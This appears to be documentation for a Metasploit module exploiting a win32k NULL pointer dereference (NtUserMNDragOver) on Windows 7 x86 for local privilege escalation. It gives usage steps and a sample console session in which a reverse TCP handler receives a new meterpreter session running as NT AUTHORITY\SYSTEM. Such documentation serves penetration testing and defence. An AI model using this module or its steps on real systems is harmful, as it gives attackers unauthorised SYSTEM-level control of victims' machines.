## Vulnerable Application

This module exploits a null pointer deference in win32k triggered by the NTUserMNDragOver syscall.
After receiving the menu window object returned by the window procedure function, the xxxMNFindWindowFromPoint function does not effectively check the validity of its member tagPOPUPMENU, causing the subsequent MNGetpItemFromIndex function to trigger the NULL pointer deference.
This module has been tested against Windows 7 x86 SP0 and SP1. Offsets within the solution may need to be adjusted to work with other versions of Windows.

## Verification Steps

1. Get a non-SYSTEM meterpreter session on Windows 7 x86
2. `use exploit/windows/local/ntusermndragover`
3. `set session <session>`
4. `exploit`
5. Get a SYSTEM session

## Scenarios

### Windows 7 SP0 x86

```
msf5 exploit(windows/local/ntusermndragover) > sessions 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : USER-PC
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/local/ntusermndragover) > run

[*] Started reverse TCP handler on 192.168.56.1:4446
[*] Launching notepad.exe to host the exploit...
[+] Process 3388 launched.
[*] Injecting exploit into 3388 ...
[*] Executing exploit...
[*] Sending stage (180291 bytes) to 192.168.56.15
[*] Meterpreter session 2 opened (192.168.56.1:4446 -> 192.168.56.15:49173) at 2020-04-17 18:34:58 +0800

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```
